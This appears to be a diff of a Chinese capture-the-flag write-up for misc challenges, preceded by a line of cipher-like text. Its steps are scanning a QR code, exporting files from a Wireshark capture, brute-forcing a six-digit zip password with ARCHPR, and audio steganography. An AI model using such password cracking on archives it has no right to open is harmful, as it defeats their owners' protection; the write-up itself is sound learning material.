 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y   h jnsxf qjFjf jnb  rg fiyykwtbsnkm tm  xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.
 
@@ -1170,7 +1170,7 @@ JRFVJYFZVRUAGMAI
 然后简单粗暴拿iPhone扫了一下
 <img src="media/15792383134168/IMG_1973.jpg" alt="IMG_1973">
 拿到flag</p>
-<h4 id="每日推荐">每日推荐</h4>
+<h5 id="每日推荐">每日推荐</h5>
 <p>压缩包打开，是Wireshark抓包文件，稍微分析一下，题目提到音乐，就干脆Wireshark里选择HTTP导出，大小从大到小排列，第一个研究了一下发现是个压缩包，导出保存。
 <img src="media/15792383134168/Screen%20Shot%202020-01-18%20at%2011.24.25%20AM.png" alt="Screen Shot 2020-01-18 at 11.24.25 A">
 解压需要密码，7zip打开看提示说密码为六位数字，上ARCHPR爆破半分钟拿到密码。
@@ -1178,7 +1178,7 @@ JRFVJYFZVRUAGMAI
 解压出一首歌，考虑是音频隐写，Audacity打开，一番乱试之后。。。
 <img src="media/15792383134168/Screen%20Shot%202020-01-18%20at%2011.23.09%20AM.png" alt="Screen Shot 2020-01-18 at 11.23.09 A">
 拿到flag。</p>
-<h5 id="week1-misc-ak">Week1 Misc AK</h5>
+<h6 id="week1-misc-ak">Week1 Misc AK</h6>
 
     </div>
     <div class="post-footer">
